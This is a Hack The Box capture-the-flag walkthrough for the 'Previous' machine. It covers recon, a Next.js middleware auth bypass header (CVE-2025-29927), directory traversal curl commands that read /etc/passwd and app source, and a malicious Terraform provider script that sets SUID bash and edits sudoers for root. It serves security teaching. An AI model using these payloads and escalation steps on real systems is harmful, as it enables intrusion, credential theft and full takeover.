---
title: Previous — HTB
author: Radeel Ahmad
pubDatetime: 2025-08-24T09:19:00Z
tags:
  - hacking
  - HTB
  - Next.js
  - CVE-2025-29927
description:
  Step-by-step walkthrough of the Hack The Box machine "Previous" — a Next.js middleware auth bypass, directory traversal via /api/download, and a malicious Terraform provider for root.
---

### Previous — HTB

In this article, I will provide a step-by-step guide to solve the Hack The Box machine '**Previous**'.

![](/blog/images/htb/1*k5syQ9d9JPqEgBbzbQA_Xw.png)

Nmap Scan:

```
┌──(kali㉿kali)-[~/Desktop/HTB/Previous]
└─$ nmap -sV -sC 10.10.11.83
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-24 09:19 UTC
Nmap scan report for previous.htb (10.10.11.83)
Host is up (0.54s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: PreviousJS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 366.28 seconds
```

Update `etc/hosts`:

```
10.10.11.83 previous.htb
```

![](/blog/images/htb/1*MwJ2CCYzB84vU8sJRCutEA.png)

Perform directory busting:

```
┌──(kali㉿kali)-[~/Desktop/HTB/Previous]
└─$ dirsearch -u previous.htb -t 50
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 50 | Wordlist size: 11460

Output File: /home/kali/Desktop/HTB/Previous/reports/_previous.htb/_25-08-24_09-17-30.txt

Target: http://previous.htb/

[09:17:32] Starting:
[09:19:50] 307 -   35B  - /api  ->  /api/auth/signin?callbackUrl=%2Fapi
[09:19:50] 307 -   39B  - /api.php  ->  /api/auth/signin?callbackUrl=%2Fapi.php
[09:19:50] 307 -   38B  - /api.py  ->  /api/auth/signin?callbackUrl=%2Fapi.py
[09:19:50] 307 -   40B  - /api-docs  ->  /api/auth/signin?callbackUrl=%2Fapi-docs
[09:19:50] 307 -   39B  - /api.log  ->  /api/auth/signin?callbackUrl=%2Fapi.log
[09:19:50] 307 -   52B  - /api/cask/graphql  ->  /api/auth/signin?callbackUrl=%2Fapi%2Fcask%2Fgraphql
[09:19:51] 307 -   42B  - /api/docs  ->  /api/auth/signin?callbackUrl=%2Fapi%2Fdocs
[09:19:51] 307 -   45B  - /api/profile  ->  /api/auth/signin?callbackUrl=%2Fapi%2Fprofile
[09:19:51] 307 -   50B  - /api/swagger.yaml  ->  /api/auth/signin?callbackUrl=%2Fapi%2Fswagger.yaml
[09:19:51] 307 -   55B  - /api/swagger/swagger  ->  /api/auth/signin?callbackUrl=%2Fapi%2Fswagger%2Fswagger
[09:19:51] 307 -   58B  - /api/swagger/ui/index  ->  /api/auth/signin?callbackUrl=%2Fapi%2Fswagger%2Fui%2Findex
[09:19:51] 307 -   40B  - /api/v1  ->  /api/auth/signin?callbackUrl=%2Fapi%2Fv1
[09:19:51] 307 -   52B  - /api/timelion/run  ->  /api/auth/signin?callbackUrl=%2Fapi%2Ftimelion%2Frun
[09:19:51] 307 -   55B  - /api/v2/swagger.json  ->  /api/auth/signin?callbackUrl=%2Fapi%2Fv2%2Fswagger.json
[09:19:51] 307 -   40B  - /api/v4  ->  /api/auth/signin?callbackUrl=%2Fapi%2Fv4
[09:19:51] 307 -   55B  - /api/v2/swagger.yaml  ->  /api/auth/signin?callbackUrl=%2Fapi%2Fv2%2Fswagger.yaml
[09:19:51] 307 -   40B  - /api/v3  ->  /api/auth/signin?callbackUrl=%2Fapi%2Fv3
[09:19:51] 307 -   40B  - /api/v2  ->  /api/auth/signin?callbackUrl=%2Fapi%2Fv2
[09:19:51] 307 -   55B  - /api/v1/swagger.yaml  ->  /api/auth/signin?callbackUrl=%2Fapi%2Fv1%2Fswagger.yaml
[09:19:51] 307 -   62B  - /api/v2/helpdesk/discover  ->  /api/auth/signin?callbackUrl=%2Fapi%2Fv2%2Fhelpdesk%2Fdiscover
[09:19:51] 307 -   55B  - /api/v1/swagger.json  ->  /api/auth/signin?callbackUrl=%2Fapi%2Fv1%2Fswagger.json
[09:19:51] 307 -   39B  - /api-doc  ->  /api/auth/signin?callbackUrl=%2Fapi-doc
[09:19:51] 307 -   74B  - /api/vendor/phpunit/phpunit/phpunit  ->  /api/auth/signin?callbackUrl=%2Fapi%2Fvendor%2Fphpunit%2Fphpunit%2Fphpunit
[09:19:51] 307 -   54B  - /api/application.wadl  ->  /api/auth/signin?callbackUrl=%2Fapi%2Fapplication.wadl
[09:19:51] 307 -   60B  - /api/apidocs/swagger.json  ->  /api/auth/signin?callbackUrl=%2Fapi%2Fapidocs%2Fswagger.json
[09:19:51] 307 -   41B  - /api/api  ->  /api/auth/signin?callbackUrl=%2Fapi%2Fapi
[09:19:51] 307 -   47B  - /api/error_log  ->  /api/auth/signin?callbackUrl=%2Fapi%2Ferror_log
[09:19:51] 307 -   60B  - /api/2/issue/createmeta  ->  /api/auth/signin?callbackUrl=%2Fapi%2F2%2Fissue%2Fcreatemeta
[09:19:51] 307 -   53B  - /api/jsonws/invoke  ->  /api/auth/signin?callbackUrl=%2Fapi%2Fjsonws%2Finvoke
[09:19:51] 307 -   48B  - /api/index.html  ->  /api/auth/signin?callbackUrl=%2Fapi%2Findex.html
[09:19:51] 307 -   43B  - /api/batch  ->  /api/auth/signin?callbackUrl=%2Fapi%2Fbatch
[09:19:51] 307 -   73B  - /api/package_search/v4/documentation  ->  /api/auth/signin?callbackUrl=%2Fapi%2Fpackage_search%2Fv4%2Fdocumentation
[09:19:51] 307 -   44B  - /api/jsonws  ->  /api/auth/signin?callbackUrl=%2Fapi%2Fjsonws
[09:19:51] 307 -   48B  - /api/login.json  ->  /api/auth/signin?callbackUrl=%2Fapi%2Flogin.json
[09:19:51] 307 -   44B  - /api/config  ->  /api/auth/signin?callbackUrl=%2Fapi%2Fconfig
[09:19:51] 307 -   47B  - /api/snapshots  ->  /api/auth/signin?callbackUrl=%2Fapi%2Fsnapshots
[09:19:51] 307 -   58B  - /api/swagger/index.html  ->  /api/auth/signin?callbackUrl=%2Fapi%2Fswagger%2Findex.html
[09:19:51] 307 -   57B  - /api/spec/swagger.json  ->  /api/auth/signin?callbackUrl=%2Fapi%2Fspec%2Fswagger.json
[09:19:51] 307 -   36B  - /apis  ->  /api/auth/signin?callbackUrl=%2Fapis
[09:19:51] 307 -   49B  - /apiserver-key.pem  ->  /api/auth/signin?callbackUrl=%2Fapiserver-key.pem
[09:19:51] 307 -   43B  - /api/proxy  ->  /api/auth/signin?callbackUrl=%2Fapi%2Fproxy
[09:19:51] 307 -   52B  - /apiserver-client.crt  ->  /api/auth/signin?callbackUrl=%2Fapiserver-client.crt
[09:19:52] 307 -   46B  - /api/api-docs  ->  /api/auth/signin?callbackUrl=%2Fapi%2Fapi-docs
[09:19:54] 307 -   57B  - /apiserver-aggregator.cert  ->  /api/auth/signin?callbackUrl=%2Fapiserver-aggregator.cert
[09:19:54] 307 -   38B  - /apidoc  ->  /api/auth/signin?callbackUrl=%2Fapidoc
[09:19:54] 307 -   45B  - /api/version  ->  /api/auth/signin?callbackUrl=%2Fapi%2Fversion
[09:19:54] 307 -   44B  - /apibuild.pyc  ->  /api/auth/signin?callbackUrl=%2Fapibuild.pyc
[09:19:54] 307 -   60B  - /apiserver-aggregator-ca.cert  ->  /api/auth/signin?callbackUrl=%2Fapiserver-aggregator-ca.cert
[09:19:54] 307 -   44B  - /api/whoami  ->  /api/auth/signin?callbackUrl=%2Fapi%2Fwhoami
[09:19:54] 307 -   56B  - /apiserver-aggregator.key  ->  /api/auth/signin?callbackUrl=%2Fapiserver-aggregator.key
[09:19:54] 307 -   39B  - /apidocs  ->  /api/auth/signin?callbackUrl=%2Fapidocs
[09:19:54] 307 -   45B  - /api/apidocs  ->  /api/auth/signin?callbackUrl=%2Fapi%2Fapidocs
[09:19:57] 307 -   50B  - /api/swagger.json  ->  /api/auth/signin?callbackUrl=%2Fapi%2Fswagger.json
[09:20:00] 307 -   45B  - /api/swagger  ->  /api/auth/signin?callbackUrl=%2Fapi%2Fswagger
[09:20:00] 308 -   19B  - /axis//happyaxis.jsp  ->  /axis/happyaxis.jsp
[09:20:00] 308 -   24B  - /axis2-web//HappyAxis.jsp  ->  /axis2-web/HappyAxis.jsp
[09:20:00] 308 -   30B  - /axis2//axis2-web/HappyAxis.jsp  ->  /axis2/axis2-web/HappyAxis.jsp
[09:20:01] 307 -   53B  - /api/swagger-ui.html  ->  /api/auth/signin?callbackUrl=%2Fapi%2Fswagger-ui.html
[09:20:01] 307 -   49B  - /api/swagger.yml  ->  /api/auth/signin?callbackUrl=%2Fapi%2Fswagger.yml
[09:20:01] 307 -   67B  - /api/swagger/static/index.html  ->  /api/auth/signin?callbackUrl=%2Fapi%2Fswagger%2Fstatic%2Findex.html
[09:20:17] 308 -   52B  - /Citrix//AccessPlatform/auth/clientscripts/cookies.js  ->  /Citrix/AccessPlatform/auth/clientscripts/cookies.js
[09:20:43] 307 -   36B  - /docs  ->  /api/auth/signin?callbackUrl=%2Fdocs
[09:20:43] 307 -   52B  - /docs/changelog.txt  ->  /api/auth/signin?callbackUrl=%2Fdocs%2Fchangelog.txt
[09:20:43] 307 -   53B  - /docs/CHANGELOG.html  ->  /api/auth/signin?callbackUrl=%2Fdocs%2FCHANGELOG.html
[09:20:43] 307 -   51B  - /docs/updating.txt  ->  /api/auth/signin?callbackUrl=%2Fdocs%2Fupdating.txt
[09:20:43] 307 -   54B  - /docs/export-demo.xml  ->  /api/auth/signin?callbackUrl=%2Fdocs%2Fexport-demo.xml
[09:20:43] 307 -   66B  - /docs/html/admin/ch03s07.html  ->  /api/auth/signin?callbackUrl=%2Fdocs%2Fhtml%2Fadmin%2Fch03s07.html
[09:20:43] 307 -   38B  - /docs51  ->  /api/auth/signin?callbackUrl=%2Fdocs51
[09:20:43] 307 -   54B  - /docs/maintenance.txt  ->  /api/auth/signin?callbackUrl=%2Fdocs%2Fmaintenance.txt
[09:20:43] 307 -   67B  - /docs/html/developer/ch02.html  ->  /api/auth/signin?callbackUrl=%2Fdocs%2Fhtml%2Fdeveloper%2Fch02.html
[09:20:43] 307 -   56B  - /docs/html/index.html  ->  /api/auth/signin?callbackUrl=%2Fdocs%2Fhtml%2Findex.html
[09:20:43] 307 -   66B  - /docs/html/admin/ch01s04.html  ->  /api/auth/signin?callbackUrl=%2Fdocs%2Fhtml%2Fadmin%2Fch01s04.html
[09:20:43] 307 -   70B  - /docs/html/developer/ch03s15.html  ->  /api/auth/signin?callbackUrl=%2Fdocs%2Fhtml%2Fdeveloper%2Fch03s15.html
[09:20:43] 307 -   63B  - /docs/html/admin/ch01.html  ->  /api/auth/signin?callbackUrl=%2Fdocs%2Fhtml%2Fadmin%2Fch01.html
[09:20:43] 307 -   64B  - /docs/html/admin/index.html  ->  /api/auth/signin?callbackUrl=%2Fdocs%2Fhtml%2Fadmin%2Findex.html
[09:20:43] 307 -   51B  - /docs/swagger.json  ->  /api/auth/signin?callbackUrl=%2Fdocs%2Fswagger.json
[09:20:44] 307 -   41B  - /docs.json  ->  /api/auth/signin?callbackUrl=%2Fdocs.json
[09:20:49] 308 -   42B  - /engine/classes/swfupload//swfupload_f9.swf  ->  /engine/classes/swfupload/swfupload_f9.swf
[09:20:49] 308 -   39B  - /engine/classes/swfupload//swfupload.swf  ->  /engine/classes/swfupload/swfupload.swf
[09:20:56] 308 -   27B  - /extjs/resources//charts.swf  ->  /extjs/resources/charts.swf
[09:21:08] 308 -   37B  - /html/js/misc/swfupload//swfupload.swf  ->  /html/js/misc/swfupload/swfupload.swf
[09:22:32] 200 -    3KB - /signin
```

We fingerprint the web technologies

- Email: `jeremy@previous.htb`
- **Next.js** is running

```
┌──(kali㉿kali)-[~/Downloads]
└─$  whatweb http://previous.htb
http://previous.htb [200 OK] Country[RESERVED][ZZ], Email[jeremy@previous.htb], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.83], Script[application/json], X-Powered-By[Next.js], nginx[1.18.0]
```

#### CVE-2025–29927

**CVE-2025-29927: Next.js Vulnerability Explained** — *A critical Next.js Vulnerability (CVE-2025-29927) lets attackers bypass authentication. Learn how it works and protect…* — strobes.co

**GitHub - alihussainzada/CVE-2025-29927-PoC** — *PoC for CVE-2025-29927: Next.js Middleware Bypass Vulnerability. Demonstrates how x-middleware-subrequest can bypass…* — github.com

```
X-Middleware-Subrequest: src/middleware:nowaf:src/middleware:src/middleware:src/middleware:src/middleware:middleware:middleware:nowaf:middleware:middleware:middleware:pages/_middleware
```

Brute-force API endpoints, and we found `/api/download`

```
┌──(kali㉿kali)-[~/Downloads]
└─$ dirsearch -u http://previous.htb/api/ \
  -w /usr/share/wordlists/dirb/common.txt \
  -H 'X-Middleware-Subrequest: src/middleware:nowaf:src/middleware:src/middleware:src/middleware:src/middleware:middleware:middleware:nowaf:middleware:middleware:middleware:pages/_middleware'

/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 4613

Output File: /home/kali/Downloads/reports/http_previous.htb/_api__25-08-24_10-05-15.txt

Target: http://previous.htb/

[10:05:15] Starting: api/
[10:06:27] 400 -   28B  - /api/download

Task Completed
```

The `/api/download` endpoint allows users to download a file by providing its name through the `example` parameter. However, the application does not properly sanitize or restrict this parameter. As a result, an attacker can exploit it using directory traversal sequences (`../`) to escape the intended folder and access sensitive system files.

```
┌──(kali㉿kali)-[~/Downloads]
└─$ curl -s 'http://previous.htb/api/download?example=../../../../etc/passwd' -H 'X-Middleware-Subrequest: src/middleware:nowaf:src/middleware:src/middleware:src/middleware:src/middleware:middleware:middleware:nowaf:middleware:middleware:middleware:pages/_middleware'
root:x:0:0:root:/root:/bin/sh
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/mail:/sbin/nologin
news:x:9:13:news:/usr/lib/news:/sbin/nologin
uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
cron:x:16:16:cron:/var/spool/cron:/sbin/nologin
ftp:x:21:21::/var/lib/ftp:/sbin/nologin
sshd:x:22:22:sshd:/dev/null:/sbin/nologin
games:x:35:35:games:/usr/games:/sbin/nologin
ntp:x:123:123:NTP:/var/empty:/sbin/nologin
guest:x:405:100:guest:/dev/null:/sbin/nologin
nobody:x:65534:65534:nobody:/:/sbin/nologin
node:x:1000:1000::/home/node:/bin/sh
nextjs:x:1001:65533::/home/nextjs:/sbin/nologin
```

**Read server configuration.**

> This file is the entry point that launches the **Next.js** server.

```
┌──(kali㉿kali)-[~/Downloads]
└─$ curl -s 'http://previous.htb/api/download?example=../../../../app/server.js' \
  -H 'X-Middleware-Subrequest: src/middleware:nowaf:src/middleware:src/middleware:src/middleware:src/middleware:middleware:middleware:nowaf:middleware:middleware:middleware:pages/_middleware'

const path = require('path')

const dir = path.join(__dirname)

process.env.NODE_ENV = 'production'
process.chdir(__dirname)

const currentPort = parseInt(process.env.PORT, 10) || 3000
const hostname = process.env.HOSTNAME || '0.0.0.0'

require('next')
const { startServer } = require('next/dist/server/lib/start-server')

startServer({
  dir,
  isDev: false,
  hostname,
  port: currentPort,
  allowRetry: false,
}).catch((err) => {
  console.error(err);
  process.exit(1);
});
```

**Extract routing information.**

> This manifest shows the routing structure of the application, including hidden or dynamic endpoints like **NextAuth** and **docs sections**.

```
┌──(kali㉿kali)-[~/Downloads]
└─$ curl -s 'http://previous.htb/api/download?example=../../../../app/.next/routes-manifest.json' \
  -H 'X-Middleware-Subrequest: src/middleware:nowaf:src/middleware:src/middleware:src/middleware:src/middleware:middleware:middleware:nowaf:middleware:middleware:middleware:pages/_middleware'

{
  "version": 3,
  "pages404": true,
  "dynamicRoutes": [
    { "page": "/api/auth/[...nextauth]" },
    { "page": "/docs/[section]" }
  ],
  "staticRoutes": [
    { "page": "/" },
    { "page": "/docs" },
    { "page": "/signin" }
  ]
}
```

**Sensitive NextAuth source file**

> This file defines the **NextAuth** credentials provider and leaks the `ADMIN_SECRET`: `MyNameIsJeremyAndILovePancakes`

```
┌──(kali㉿kali)-[~/Downloads]
└─$ curl -s 'http://previous.htb/api/download?example=../../../../app/.next/server/pages/api/auth/%5B...nextauth%5D.js' \
  -H 'X-Middleware-Subrequest: src/middleware:nowaf:src/middleware:src/middleware:src/middleware:src/middleware:middleware:middleware:nowaf:middleware:middleware:middleware:pages/_middleware'

...authorize:async e=>e?.username==="jeremy"&&e.password===(process.env.ADMIN_SECRET??"MyNameIsJeremyAndILovePancakes")?{id:"1",name:"Jeremy"}:null...
```

- jeremy — MyNameIsJeremyAndILovePancakes

We connect via SSH as Jeremy

```
jeremy@previous:~$ls
docker  user.txt
jeremy@previous:~$cat user.txt
f727ea51c11a84****************
jeremy@previous:~$
```

---

### Root Flag:

Check the available sudo privileges and explore the `examples` directory.

```
jeremy@previous:~$sudo -l
Matching Defaults entries for jeremy on previous:
    !env_reset, env_delete+=PATH, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User jeremy may run the following commands on previous:
    (root) /usr/bin/terraform -chdir\=/opt/examples apply
jeremy@previous:/opt/examples$cd /opt/examples && ls -al
total 28
drwxr-xr-x 3 root root 4096 Aug 24 10:45 .
drwxr-xr-x 5 root root 4096 Aug 21 20:09 ..
-rw-r--r-- 1 root root   18 Apr 12 20:32 .gitignore
-rw-r--r-- 1 root root  576 Aug 21 18:15 main.tf
drwxr-xr-x 3 root root 4096 Aug 21 20:09 .terraform
-rw-r--r-- 1 root root  247 Aug 21 18:16 .terraform.lock.hcl
-rw-r--r-- 1 root root 1097 Aug 24 10:45 terraform.tfstate
```

Read **main.tf**

> This config forces Terraform to process files inside `/root/examples/`

```
jeremy@previous:/opt/examples$ cat main.tf
terraform {
  required_providers {
    examples = {
      source = "previous.htb/terraform/examples"
    }
  }
}

variable "source_path" {
  type = string
  default = "/root/examples/hello-world.ts"

  validation {
    condition = strcontains(var.source_path, "/root/examples/") && !strcontains(var.source_path, "..")
    error_message = "The source_path must contain '/root/examples/'."
  }
}

provider "examples" {}

resource "examples_example" "example" {
  source_path = var.source_path
}

output "destination_path" {
  value = examples_example.example.destination_path
}
```

- Save fake provider at `/tmp/terraform-provider-examples`. Script sets **SUID** on `/bin/bash`. Creates `/tmp/rootbash`. Adds user **jeremy** to `sudoers`.
- Run `chmod +x /tmp/terraform-provider-examples`.
- Write `/tmp/terraform.rc` with a `dev_overrides` rule mapping `previous.htb/terraform/examples` → `/tmp`.
- Export `TF_CLI_CONFIG_FILE=/tmp/terraform.rc` so Terraform loads the malicious provider.
- Running `sudo /usr/bin/terraform -chdir=/opt/examples apply` forces Terraform to load the malicious provider, which executes with root privileges and creates a SUID `/tmp/rootbash` binary while adding the user **jeremy** to `sudoers`.
- Gain a root shell.
- Capture the root flag.

```
jeremy@previous:/opt/examples$cat > /tmp/terraform-provider-examples << 'EOF'
#!/bin/bash
# Malicious provider script
chmod +s /bin/bash
cp /bin/bash /tmp/rootbash && chmod +xs /tmp/rootbash
echo 'jeremy ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers
echo '{"malicious": "provider"}'
EOF
jeremy@previous:/opt/examples$chmod +x /tmp/terraform-provider-examples
jeremy@previous:/opt/examples$cat > /tmp/terraform.rc << 'EOF'
provider_installation {
  dev_overrides {
    "previous.htb/terraform/examples" = "/tmp"
  }
  direct {}
}
EOF
jeremy@previous:/opt/examples$export TF_CLI_CONFIG_FILE=/tmp/terraform.rc
jeremy@previous:/opt/examples$sudo /usr/bin/terraform -chdir=/opt/examples apply
[sudo] password for jeremy:
╷
│ Warning: Provider development overrides are in effect
│
│ The following provider development overrides are set in the CLI configuration:
│  - previous.htb/terraform/examples in /tmp
│
│ The behavior may therefore not match any released version of the provider and applying changes may cause the state to become incompatible with published releases.
╵
╷
│ Error: Failed to load plugin schemas
│
│ Error while loading schemas for plugin components: Failed to obtain provider schema: Could not load the schema for provider previous.htb/terraform/examples: failed to instantiate
│ provider "previous.htb/terraform/examples" to obtain schema: Unrecognized remote plugin message: {"malicious": "provider"}
│ This usually means
│   the plugin was not compiled for this architecture,
│   the plugin is missing dynamic-link libraries necessary to run,
│   the plugin is not executable by this process due to file permissions, or
│   the plugin failed to negotiate the initial go-plugin protocol handshake
│
│ Additional notes about plugin:
│   Path: /tmp/terraform-provider-examples
│   Mode: -rwxrwxr-x
│   Owner: 1000 [jeremy] (current: 0 [root])
│   Group: 1000 [jeremy] (current: 0 [root])
│ ..
╵
jeremy@previous:/opt/examples$/tmp/rootbash -p

rootbash-5.1# cat /root/root.txt
98c62b55fb1bf43**********
rootbash-5.1#
```

---

**Thank You** for reading this article. I hope that you have found this information provided to be valuable and helpful. Use it for educational purposes only…. 🙂

**RADEEL AHMAD**
